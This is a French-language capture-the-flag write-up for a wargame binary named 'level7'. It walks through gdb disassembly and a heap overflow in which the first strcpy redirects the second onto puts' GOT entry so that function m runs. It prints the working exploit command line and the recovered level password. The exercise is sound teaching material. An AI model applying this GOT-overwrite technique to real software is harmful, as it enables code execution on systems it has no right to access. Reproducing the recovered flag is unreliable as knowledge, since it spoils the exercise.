# Level7

On observe un executable a la racine `level7`

```bash
$ ./level7
Segmentation fault (core dumped)

$ ./level7 "Hello World"
Segmentation fault (core dumped)

$ ./level7 "Hello" "World"
~~
```

On cherche donc a comprendre ce que fait l'executable

```bash
$ gdb level7 -q
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:      push   ebp
   0x08048522 <+1>:      mov    ebp,esp
   0x08048524 <+3>:      and    esp,0xfffffff0
   0x08048527 <+6>:      sub    esp,0x20
   0x0804852a <+9>:      mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:     call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:     mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:     mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:     mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:     mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:     call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:     mov    edx,eax
   0x08048552 <+49>:     mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:     mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:     mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:     call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:     mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:     mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:     mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:     mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:     call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:     mov    edx,eax
   0x08048581 <+96>:     mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:    mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:    add    eax,0x4
   0x0804858e <+109>:    mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:    mov    edx,eax
   0x08048592 <+113>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:    mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:    mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:    call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:    add    eax,0x8
   0x080485ab <+138>:    mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:    mov    edx,eax
   0x080485af <+142>:    mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:    mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:    mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:    mov    DWORD PTR [esp],eax
   0x080485bd <+156>:    call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:    mov    edx,0x80486e9
   0x080485c7 <+166>:    mov    eax,0x80486eb
   0x080485cc <+171>:    mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:    mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:    call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:    mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:    mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:    mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:    call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:    mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:    call   0x8048400 <puts@plt>
   0x080485fc <+219>:    mov    eax,0x0
   0x08048601 <+224>:    leave
   0x08048602 <+225>:    ret
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:      push   ebp
   0x080484f5 <+1>:      mov    ebp,esp
   0x080484f7 <+3>:      sub    esp,0x18
   0x080484fa <+6>:      mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:     call   0x80483d0 <time@plt>
   0x08048506 <+18>:     mov    edx,0x80486e0
   0x0804850b <+23>:     mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:     mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:     mov    DWORD PTR [esp],edx
   0x0804851a <+38>:     call   0x80483b0 <printf@plt>
   0x0804851f <+43>:     leave
   0x08048520 <+44>:     ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir un idee plus clair de `level7`

```bash
$ scp -P 4242 -r level7@192.168.56.102:/home/user/level7/level7 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level7
```

_resultat sauvegarde dans [source.md](source.md)_

On cherche a faire pointer la fonction `puts` vers la fonction `m`

Pour cela, nous nous servons du premier `strcpy` pour modifier l'adresse
d'ecriture du second `strcpy` vers le `puts` qui est a l'adresse `0x8049928`

Maintenant que le second `strcpy` est dirige vers le puts, nous allons modifier
la valeur a cette adresse pour pointer vers la fonction `m`

```bash
(gdb) break *main+21
Breakpoint 1 at 0x8048536
(gdb) break *main+68
Breakpoint 2 at 0x8048565
(gdb) run "hello"
Starting program: /home/user/level7/level7 "hello"

Breakpoint 1, 0x08048536 in main ()
(gdb) i r eax
eax            0x804a008	134520840

Breakpoint 2, 0x08048565 in main ()
(gdb) i r eax
eax            0x804a028	134520872
```

<code>0x804a028 - 0x804a008 = 20<sub>16</sub></code>

Nous avons notre premier parametre `python -c 'print ("A"*20) + "\x28\x99\x04\x08"'`

Notre deuxieme parametre est l'adresse de la fonction `m` `\xf4\x84\x04\x08`

Plus qu'a regrouper toute nos string et a essayyer

```bash
$ ./level7 `python -c 'print ("A"*20) + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1670340479

level7:$ su level8
Password:

level8:$
```
